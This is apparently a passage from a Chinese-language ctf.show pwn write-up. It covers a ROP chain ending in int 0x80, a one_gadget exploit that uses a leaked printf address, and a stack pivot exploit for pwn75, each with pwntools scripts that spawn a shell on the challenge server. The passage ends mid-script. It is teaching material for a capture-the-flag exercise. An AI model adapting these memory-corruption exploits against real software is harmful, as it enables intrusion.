ret</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806f02a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea068</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08049303</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor eax, eax ; ret</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080549db</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080481c9</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop ebx ; ret</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080de955</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop ecx ; ret</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea068</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806f02a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea068</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08049303</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor eax, eax ; ret</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a86f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806cc25</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># int 0x80</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>P<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>P<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn74利用one_gadget\"><a class=\"anchor\" href=\"#pwn74利用one_gadget\">#</a> pwn74（利用 one_gadget）</h1>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p>题目描述： <code>噢？好像到现在为止还没有了解到one_gadget?</code></p>\n<p>64 位保护全开</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v4<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v4<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_A80<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_B00<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_B90<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_C20<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_CA8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_D40<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>aClassifyCtfsho<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Type  : PWN_Tricks                                              \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Site  : https://ctf.show/                                       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Hint  : Use one_gadget a shuttle!                               \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this:%p ?\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>printf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%ld\"</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v4<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>v4<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有 scanf 函数，可以进行栈溢出，但是开启了 canary，而下面调用了函数指针【将我们输入的值利用函数指针的特性，将其转换为函数并进行调用】</p>\n<p>所以我们输入要执行的函数地址就会被执行，题目说明利用 one_gadget，那么我们可以通过 one_gadget 工具查找对应的 libc 库内的 <code>execve(&quot;/bin/sh&quot;,0,0)</code>  函数的地址（有限制条件）然后利用该地址 + libc 基地址即可</p>\n<p>发现只有第三个符合要求</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/DOJW%24X%7DLWIR2%24_%60ZV7%28Z0PP.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process(\"\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn74\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28128</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./64libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"this:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>printf<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"print:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>printf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc_base<span class=\"token operator\">=</span>printf<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"printf\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>execve<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x10a2fc</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn75-栈迁移\"><a class=\"anchor\" href=\"#pwn75-栈迁移\">#</a> pwn75 (栈迁移)</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p>题目描述： <code>栈空间不够怎么办？</code></p>\n<p>32 位程序，开启了 NX</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-28h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome, %s\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What do you want to do?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Nothing here ,%s\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>栈迁移，由于溢出部分很少，那么我们可以先在栈内构造 system_plt 然后将将栈低迁移到 <code>s</code>  的起始处，利用第二个 read 读入 <code>&quot;/bin/sh&quot;</code> ，因为我们要将栈迁移到栈顶，所以要泄露 ebp 的地址，而需要通过调试来找到我们输入的字符串相对与 ebp 的偏移（不一定会是在栈顶）</p>\n<p>调试：</p>\n<p>在要知道与 ebp 的偏移，就需要进行动态调试【动态调试要 <code>start</code>  进入输入完后直接查看栈，不然利用 <code>r</code>  输入完后查看会被改变】：</p>\n<p>首先查看 buf 的地址 (一步一步进入到 read 处)：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/C%5BGMWAP38%7BTD95DRA39HYWR.png\" alt=\"\" /></p>\n<p>输入 <code>aaaa</code>  查看栈：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/%5DX4FU%25E%7B7F6I%7E%7BNMU7%293H%5BF.png\" alt=\"\" /></p>\n<p>对于这里 ebp <code>0xffffd008</code>  是当前函数的 ebp，框里的是 main 的 ebp，要通过 main 的 ebp 函数来计算（因为泄露的是 main 函数的 ebp 地址）</p>\n<p>最后偏移：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/FQE7DIW9%245SZ1M149O8%40%60%7DE.png\" alt=\"\" /></p>\n<p>因此就知道了 buf 与 ebp 的偏移 <code>buf=ebp-0x38</code></p>\n<p>利用 printf 将 ebp 泄露出来即可（printf 输出字符串时遇到 <code>\\0</code>  会停止输出，只要填满就不会插入空字符）</p>\n<p>一开始想用 read 写入 <code>/bin/sh</code>  发现不行，感觉是因为将栈内容改变了。。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn75')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28231</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>leave_ret<span class=\"token operator\">=</span><span class=\"token number\">0x080484d5</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x8048400</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read<span class=\"token operator\">=</span><span class=\"token number\">0x80483D0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"codename:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x24</span><span class=\"token operator\">+</span><span class=\"token string\">b\"flag\"</span><span class=\"token comment\">#p32()+p32(system)+p32(flag)#+p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#payload1=p64()+p64()+p64()+p64()</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b *\")</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#gdb.attach(pid)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>ebp<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>buf<span class=\"token operator\">=</span>ebp<span class=\"token operator\">-</span><span class=\"token number\">0x38</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ebp\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>ebp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#payload2=p32(read)+p32(system)+p32(0)+p32(buf+12)+p32(10)+p32(0)+p32(buf+12)#buf+12 is address of \"/bin/sh\" in buf,abrove is 0~4(read),4~8(system),8~12(p32(0))</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token 